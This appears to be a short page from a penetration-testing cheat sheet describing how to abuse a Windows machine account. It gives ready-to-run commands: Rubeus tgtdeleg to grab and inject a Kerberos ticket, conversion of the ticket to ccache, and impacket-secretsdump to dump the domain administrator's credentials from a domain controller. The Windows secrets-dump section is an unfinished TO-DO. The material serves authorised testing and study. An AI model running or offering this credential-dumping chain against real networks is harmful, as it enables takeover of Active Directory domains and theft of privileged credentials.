---
title: "Machine Account"
date: 2024-8-1
tags: ["Kerberos", "Credential Dumping", "Pass-The-Ticket", "Rubeus", "Ticket Granting Ticket", "Domain Controller", "Machine Account", "Microsoft Virtual Account", "Active Directory", "Windows"]
---

### Abuse #1: Microsoft virtual account

#### 1. Create a ticket from Microsoft virtual account

{{< tab set1 tab1 active >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
.\rubeus.exe tgtdeleg /nowrap /ptt
```

{{< /tabcontent >}}

#### 2. Secrets Dump

{{< tab set2 tab1 active >}}Linux{{< /tab >}}
{{< tab set2 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set2 tab1 >}}

#### 1. Convert kirbi to ccache

```console
python3 rubeustoccache.py <BASE64_TICKET> secrets.kirbi secrets.ccache
```

#### 2. Secrets Dump

```console
export KRB5CCNAME=secrets.ccache
```

```console
sudo ntpdate -s <DC> && impacket-secretsdump -k -no-pass -just-dc-user administrator
```

<small>*Ref: [RubeusToCcache](https://github.com/SolomonSklash/RubeusToCcache)*</small>

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

#### 1. TO-DO

```console
TO-DO
```

{{< /tabcontent >}}
